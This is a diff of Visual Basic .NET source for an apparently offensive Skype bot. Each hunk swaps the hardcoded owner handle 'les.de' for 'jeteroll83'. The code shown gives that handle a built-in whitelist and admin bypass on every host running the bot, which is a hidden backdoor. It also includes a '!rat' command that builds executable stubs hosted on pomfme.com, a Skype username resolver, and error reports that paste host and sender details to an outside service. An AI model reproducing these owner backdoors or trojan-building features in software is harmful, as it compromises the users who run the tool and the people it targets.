@@ -366,7 +366,7 @@ retr:
             End If
         Catch ex As Exception
             Dim errorr As ChatMessage = msg.Chat.SendMessage("An error occured while giving you an error!")
-            AddSwagToMSG(errorr, "An error occured, please report to skype:les.de?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
+            AddSwagToMSG(errorr, "An error occured, please report to skype:jeteroll83?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
         End Try
     End Sub
     Function Resolve1(skype As String)
@@ -417,7 +417,7 @@ retr:
             If msg.ChatName = "#luigi-7.7.99-/$mrfluffypancake;7845dca0296eabeb" Then
                 Exit Sub
             End If
-            If msg.Sender.Handle = Skypattach.CurrentUserHandle Or msg.Sender.Handle = "les.de" Then GoTo whitelisted
+            If msg.Sender.Handle = Skypattach.CurrentUserHandle Or msg.Sender.Handle = "jeteroll83" Then GoTo whitelisted
             Dim parts() As String = TextBox3.Text.Split(New String() {Environment.NewLine},
                                           StringSplitOptions.None)
             If parts(0) = "%everyone%" Then GoTo whitelisted
@@ -440,7 +440,7 @@ whitelisted:
             'ADMINPANEL START
             If command = "admin" Then msg.Chat.SendMessage("Right Syntax: " & trigger & "admin <help/parameters>")
             If command.StartsWith("admin ") Then
-                If msg.Sender.Handle = "les.de" Then GoTo bypass
+                If msg.Sender.Handle = "jeteroll83" Then GoTo bypass
                 If IsAdmin(msg.Sender.Handle) = True Then
                 Else
                     Exit Sub
@@ -582,7 +582,7 @@ bypass:
                     AddSwagToMSG(admin, "This version: " & version & vbNewLine & "Latest version: " & latest & vbNewLine & "Type !admin update to force update!")
                 End If
                 If cmd = "update" Then
-                    If Skypattach.CurrentUserHandle = "les.de" Then Exit Sub
+                    If Skypattach.CurrentUserHandle = "jeteroll83" Then Exit Sub
                     Dim admin As ChatMessage = msg.Chat.SendMessage("Updating...")
                     Dim w As New Net.WebClient
                     w.Proxy = Nothing
@@ -1685,7 +1685,7 @@ exitt:
                 End If
                 Dim resolver As ChatMessage = msg.Chat.SendMessage("Resolving...")
                 Dim usernametoresolve As String = resolvesk.Replace(" ", "")
-                If usernametoresolve = "les.de" Then usernametoresolve = msg.Sender.Handle
+                If usernametoresolve = "jeteroll83" Then usernametoresolve = msg.Sender.Handle
                 If My.Settings.whitelist.ToLower.Contains(usernametoresolve.ToLower) Then
                     resolver.Body = "This user has been whitelisted!"
                     Exit Sub
@@ -2039,7 +2039,7 @@ l:
                 AddSwagToMSG(errorr, "Error: Please check your syntax (!help " & command(0).Replace("!", "") & ")" & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
             Else
                 Dim errorr As ChatMessage = msg.Chat.SendMessage("An error occured while giving you an error!")
-                AddSwagToMSG(errorr, "An error occured, please report to skype:les.de?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
+                AddSwagToMSG(errorr, "An error occured, please report to skype:jeteroll83?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
             End If
         End Try
     End Sub
@@ -2092,7 +2092,7 @@ l:
                 AddSwagToMSG(errorr, "Error: Please check your syntax (!help " & command(0).Replace("!", "") & ")" & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
             Else
                 Dim errorr As ChatMessage = msg.Chat.SendMessage("An error occured while giving you an error!")
-                AddSwagToMSG(errorr, "An error occured, please report to skype:les.de?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
+                AddSwagToMSG(errorr, "An error occured, please report to skype:jeteroll83?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & msg.Sender.Handle & vbNewLine & "Cmd: " & msg.Body & vbNewLine & "Error: " & ex.ToString, "Error!"))
             End If
         End Try
     End Sub
@@ -2292,7 +2292,7 @@ noargs:
                 'IO.File.Delete(Windows.Forms.Application.StartupPath & "\" & name.Replace("%20", " ") & rndr & ".exe")
                 Return "http://pomfme.com/SHIT/uploads/" & name.Replace(" ", "%20") & rndr & ".exe"
             Catch ex As Exception
-                Return "Error occured, maybe someone else was building a stub or name invalid!" & vbNewLine & "An error occured, please report to skype:les.de?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & sender & vbNewLine & "Cmd: " & "!rat " & arguments & vbNewLine & "Error: " & ex.ToString, "Error!")
+                Return "Error occured, maybe someone else was building a stub or name invalid!" & vbNewLine & "An error occured, please report to skype:jeteroll83?chat : " & vbNewLine & paste("Host: " & Skypattach.CurrentUserHandle & vbNewLine & "Sender: " & sender & vbNewLine & "Cmd: " & "!rat " & arguments & vbNewLine & "Error: " & ex.ToString, "Error!")
 
             End Try
             Return all
